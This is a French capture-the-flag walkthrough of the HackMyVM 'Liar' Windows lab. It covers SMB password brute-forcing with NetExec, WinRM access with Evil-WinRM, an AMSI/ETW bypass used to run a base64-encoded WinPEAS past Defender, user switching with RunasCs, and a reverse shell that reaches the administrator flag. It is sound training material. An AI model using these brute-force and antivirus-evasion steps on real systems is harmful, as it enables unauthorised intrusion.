---
title: "Solution du CTF Liar de HackMyVM.eu"
tags: [CTF,HackMyVM,Windows]
---

### Hardcore pour Xavier

On commence par le nécessaire scan de ports :

```console
$ sudo nmap -T5 -p- -sCV --script vuln 192.168.56.113
Starting Nmap 7.94SVN ( https://nmap.org )
Pre-scan script results:
|_broadcast-avahi-dos: ERROR: Script execution failed (use -d to debug)
Nmap scan report for 192.168.56.113
Host is up (0.00023s latency).
Not shown: 65523 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-server-header: Microsoft-IIS/10.0
|_http-csrf: Couldn't find any CSRF vulnerabilities.
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-csrf: Couldn't find any CSRF vulnerabilities.
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
MAC Address: 08:00:27:73:A8:E4 (Oracle VirtualBox virtual NIC)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 597.37 seconds
```

Sur le port 80 j'ai énuméré en long et en large avec des extensions comme php, asp, aspx, html, zip, etc, sans succès.

Vu que la page d'index affiche un message signé "nica", on va tenter de brute-forcer cet utilisateur sur SMB. 

J'ai voulu le faire avec Hydra mais il échouait dès le lancement :

```console
$ hydra -v -l nica -P /opt/SecLists/Passwords/Common-Credentials/10-million-password-list-top-10000.txt smb://192.168.56.113
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-06-15 11:47:21
[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)
[DATA] max 1 task per 1 server, overall 1 task, 10000 login tries (l:1/p:10000), ~10000 tries per task
[DATA] attacking smb://192.168.56.113:445/
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[ERROR] invalid reply from target smb://192.168.56.113:445/
```

Ncrack, quant à lui avait un comportement pas terrible. Un coup de Wiresharl m'a montré qu'il bloquait sur le handshake du protocole SMB (négotiation).

```console
$ ncrack -T5 -v --user nica -P /opt/SecLists/Passwords/Common-Credentials/10-million-password-list-top-10000.txt smb://192.168.56.113

Starting Ncrack 0.7 ( http://ncrack.org ) at 2025-06-15 11:31 CEST

Stats: 0:00:58 elapsed; 0 services completed (1 total)
Rate: 0.00; Found: 0; About 0.48% done
Stats: 0:01:22 elapsed; 0 services completed (1 total)
Rate: 0.00; Found: 0; About 0.48% done
Stats: 0:01:53 elapsed; 0 services completed (1 total)
Rate: 0.00; Found: 0; About 0.48% done
Stats: 0:02:33 elapsed; 0 services completed (1 total)
Rate: 0.00; Found: 0; About 0.48% done
Stats: 0:02:55 elapsed; 0 services completed (1 total)
Rate: 0.00; Found: 0; About 0.48% done
caught SIGINT signal, cleaning up
```

Finalement c'est passé avec NetExec :

```console
$ nxc smb 192.168.56.113 -u nica -p /opt/SecLists/Passwords/Common-Credentials/10-million-password-list-top-10000.txt | grep -v STATUS_LOGON_FAILURE
SMB                      192.168.56.113  445    WIN-IURF14RBVGV  [*] Windows 10 / Server 2019 Build 17763 x64 (name:WIN-IURF14RBVGV) (domain:WIN-IURF14RBVGV) (signing:False) (SMBv1:False) 
SMB                      192.168.56.113  445    WIN-IURF14RBVGV  [+] WIN-IURF14RBVGV\nica:hardcore
```

J'ai alors voulu obtenir une exécution de commande via SMB :

```console
$ nxc smb 192.168.56.113 -u nica -p hardcore -x "whoami"
SMB         192.168.56.113  445    WIN-IURF14RBVGV  [*] Windows 10 / Server 2019 Build 17763 x64 (name:WIN-IURF14RBVGV) (domain:WIN-IURF14RBVGV) (signing:False) (SMBv1:False) 
SMB         192.168.56.113  445    WIN-IURF14RBVGV  [+] WIN-IURF14RBVGV\nica:hardcore
```

Echec. Idem avec `psexec` :

```console
$ psexec.py nica:hardcore@192.168.56.113
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 192.168.56.113.....
[-] share 'ADMIN$' is not writable.
[-] share 'C$' is not writable.
```

Heureusement ça passe avec WinRM :

```console
$ nxc winrm 192.168.56.113 -u nica -p hardcore -x "whoami"
WINRM       192.168.56.113  5985   WIN-IURF14RBVGV  [*] Windows 10 / Server 2019 Build 17763 (name:WIN-IURF14RBVGV) (domain:WIN-IURF14RBVGV)
WINRM       192.168.56.113  5985   WIN-IURF14RBVGV  [+] WIN-IURF14RBVGV\nica:hardcore (Pwn3d!)
WINRM       192.168.56.113  5985   WIN-IURF14RBVGV  [-] Execute command failed, current user: 'WIN-IURF14RBVGV\nica' has no 'Invoke' rights to execute command (shell type: cmd)
WINRM       192.168.56.113  5985   WIN-IURF14RBVGV  [+] Executed command (shell type: powershell)
WINRM       192.168.56.113  5985   WIN-IURF14RBVGV  win-iurf14rbvgv\nica
```

### Le compte, La brute, Le shell

Evil-WinRM est l'outil tout disposé dans ce type de sitation :

```console
$ docker run --rm -ti --name evil-winrm -v /tmp/:/data oscarakaelvis/evil-winrm -i 192.168.56.113 -u nica -p hardcore
Unable to find image 'oscarakaelvis/evil-winrm:latest' locally
latest: Pulling from oscarakaelvis/evil-winrm
f7dab3ab2d6e: Pull complete 
8690fc5f8e4d: Pull complete 
ac2c11d2d5b0: Pull complete 
908be097ff54: Pull complete 
22c2c0b36ae0: Pull complete 
f656d56e5fc2: Pull complete 
4f4fb700ef54: Pull complete 
Digest: sha256:f49728e1694defc3857d81afd367e48f5d8f3590878c7c066abe2f3b42cde146
Status: Downloaded newer image for oscarakaelvis/evil-winrm:latest
                                        
Evil-WinRM shell v3.7
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\nica\Documents> cd ..
*Evil-WinRM* PS C:\Users\nica> dir


    Directorio: C:\Users\nica


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---        9/15/2018   9:12 AM                Desktop
d-r---        9/26/2023   6:44 PM                Documents
d-r---        9/15/2018   9:12 AM                Downloads
d-r---        9/15/2018   9:12 AM                Favorites
d-r---        9/15/2018   9:12 AM                Links
d-r---        9/15/2018   9:12 AM                Music
d-r---        9/15/2018   9:12 AM                Pictures
d-----        9/15/2018   9:12 AM                Saved Games
d-r---        9/15/2018   9:12 AM                Videos
-a----        9/26/2023   6:44 PM             10 user.txt


*Evil-WinRM* PS C:\Users\nica> type user.txt
HMVWINGIFT
```

J'ai ensuite exécuté WinPEAS. Comme Defender tournait, il a fallu prendre quelques précautions.

Déjà patcher AMSI puisque j'utilise la version Powershell de WinPEAS, et deuxièmement le copier en base 64 sur le disque.  


```console
*Evil-WinRM* PS C:\Users\nica> Bypass-4MSI
                                        
Info: Patching 4MSI, please be patient...
                                        
[+] Success!
                                        
Info: Patching ETW, please be patient ..
                                        
[+] Success!
*Evil-WinRM* PS C:\Users\nica> upload wp_b64.ps1
                                        
Warning: Remember that in docker environment all local paths should be at /data and it must be mapped correctly as a volume on docker run command
                                        
Info: Uploading /data/wp_b64.ps1 to C:\Users\nica\wp_b64.ps1
                                        
Data: 145960 bytes of 145960 bytes copied
                                        
Info: Upload successful!

*Evil-WinRM* PS C:\Users\nica> $b64_content = Get-Content -Path C:\Users\nica\wp_b64.ps1 -Raw; [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b64_content)) | IEX

ADVISORY: WinPEAS - Windows local Privilege Escalation Awesome Script
WinPEAS should be used for authorized penetration testing and/or educational purposes only
Any misuse of this software will not be the responsibility of the author or of any other collaborator
Use it at your own networks and/or with the network owner's explicit permission
Indicates special privilege over an object or misconfiguration
Indicates protection is enabled or something is well configured
Indicates active users
Indicates disabled users
Indicates links
Indicates title
You can find a Windows local PE Checklist here: https://book.hacktricks.wiki/en/windows-hardening/checklist-windows-privilege-escalation.html

====================================||SYSTEM INFORMATION ||====================================
The following information is curated. To get a full list of system information, run the cmdlet get-computerinfo
systeminfo.exe : Error: Acceso denegado
    + CategoryInfo          : NotSpecified: (Error: Acceso denegado:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError

--- snip ---
```

Je ne mets pas tout l'output, mais ça a tourné longtemps, bloqué sur l'énumération de la base de registre, tout ça pour aucun résultat.

Au final, la seule chose à en tirer c'est qu'il y a un autre utilisateur sur le système nommé `akanksha`.

J'ai donc relancé une attaque par force brute et avec rockyou, c'est tombé :

```console
nxc smb 192.168.56.113 --ignore-pw-decoding -u akanksha -p /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt | grep -v STATUS_LOGON_FAILURE
SMB                      192.168.56.113  445    WIN-IURF14RBVGV  [*] Windows 10 / Server 2019 Build 17763 x64 (name:WIN-IURF14RBVGV) (domain:WIN-IURF14RBVGV) (signing:False) (SMBv1:False) 
SMB                      192.168.56.113  445    WIN-IURF14RBVGV  [+] WIN-IURF14RBVGV\akanksha:sweetgirl
```

Là encore, j'ai tenté d'avoir mon shell :

```console
$ psexec.py akanksha:sweetgirl@192.168.56.113
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 192.168.56.113.....
[-] share 'ADMIN$' is not writable.
[-] share 'C$' is not writable.
```

```console
$ wmiexec.py akanksha:sweetgirl@192.168.56.113
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] SMBv3.0 dialect used
[-] rpc_s_access_denied
```

```console
$ docker run --rm -ti --name evil-winrm2 -v /tmp/:/data oscarakaelvis/evil-winrm -i 192.168.56.113 -u akanksha -p sweetgirl
                                        
Evil-WinRM shell v3.7
                                        
Info: Establishing connection to remote endpoint
                                        
Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError
                                        
Error: Exiting with code 1
```

Pas de bol... J'ai essayé de créer une tâche planifiée qui utilise les identifiants :

```console
*Evil-WinRM* PS C:\Users\nica\Documents> $time = (Get-Date).AddMinutes(5).ToString("HH:mm")
*Evil-WinRM* PS C:\Users\nica\Documents> schtasks /create /tn "MyTask" /tr "cmd /c 'whoami > c:\test\whoami.txt'" /ru "akanksha" /rp "sweetgirl" /sc once /st $time /f
```

Mais à l'exécution ça ne passait pas. L'utilisateur ne devait pas convenir pour ce type d'action.

Dans le même style, j'ai essayé `atexec.py` qui n'a pas mieux marché.

Finalement j'ai utilisé RunasCs :

[GitHub - antonioCoco/RunasCs: RunasCs - Csharp and open version of windows builtin runas.exe](https://github.com/antonioCoco/RunasCs/tree/master)

Cet outil se rapproche plus d'un vrai login interactif sur le système. Avec la commande `runas.exe` de Windows, on ne peut pas interagir, car le shell Evil-WinRM est semi-interactif.

```console
*Evil-WinRM* PS C:\test> Import-Module .\runascs.ps1
*Evil-WinRM* PS C:\test> Invoke-RunasCs akanksha sweetgirl "cmd /c whoami /all"


INFORMACIàN DE USUARIO
----------------------

Nombre de usuario        SID
======================== ==============================================
win-iurf14rbvgv\akanksha S-1-5-21-2519875556-2276787807-2868128514-1001


INFORMACIàN DE GRUPO
--------------------

Nombre de grupo                              Tipo           SID                                            Atributos
============================================ ============== ============================================== ========================================================================
Todos                                        Grupo conocido S-1-1-0                                        Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
WIN-IURF14RBVGV\Idministritirs               Alias          S-1-5-21-2519875556-2276787807-2868128514-1002 Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
BUILTIN\Usuarios                             Alias          S-1-5-32-545                                   Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
NT AUTHORITY\INTERACTIVE                     Grupo conocido S-1-5-4                                        Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
INICIO DE SESIàN EN LA CONSOLA               Grupo conocido S-1-2-1                                        Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
NT AUTHORITY\Usuarios autentificados         Grupo conocido S-1-5-11                                       Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
NT AUTHORITY\Esta compa¤¡a                   Grupo conocido S-1-5-15                                       Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
NT AUTHORITY\Cuenta local                    Grupo conocido S-1-5-113                                      Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
NT AUTHORITY\Autenticaci¢n NTLM              Grupo conocido S-1-5-64-10                                    Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
Etiqueta obligatoria\Nivel obligatorio medio Etiqueta       S-1-16-8192


INFORMACIàN DE PRIVILEGIOS
--------------------------

Nombre de privilegio          Descripci¢n                                  Estado
============================= ============================================ =============
SeChangeNotifyPrivilege       Omitir comprobaci¢n de recorrido             Habilitada
SeIncreaseWorkingSetPrivilege Aumentar el espacio de trabajo de un proceso Deshabilitado
```

J'ai ensuite exécuté le reverse shell Go utilisé sur [Quoted]({% link _posts/2025-06-13-Solution-du-CTF-Quoted-de-HackMyVM.md %}) :

```console
c:\Users\Administrador>dir
 El volumen de la unidad C no tiene etiqueta.
 El n�mero de serie del volumen es: 26CD-AE41

 Directorio de c:\Users\Administrador

26/09/2023  18:36    <DIR>          .
26/09/2023  18:36    <DIR>          ..
26/09/2023  15:11    <DIR>          3D Objects
26/09/2023  15:11    <DIR>          Contacts
26/09/2023  15:11    <DIR>          Desktop
26/09/2023  15:11    <DIR>          Documents
26/09/2023  15:11    <DIR>          Downloads
26/09/2023  15:11    <DIR>          Favorites
26/09/2023  15:11    <DIR>          Links
26/09/2023  15:11    <DIR>          Music
26/09/2023  15:24            16.418 new.cfg
26/09/2023  15:11    <DIR>          Pictures
26/09/2023  18:36                13 root.txt
26/09/2023  15:11    <DIR>          Saved Games
26/09/2023  15:11    <DIR>          Searches
26/09/2023  15:11    <DIR>          Videos
               2 archivos         16.431 bytes
              14 dirs  45.480.108.032 bytes libres

c:\Users\Administrador>type root.txt
HMV1STWINDOWZ
```
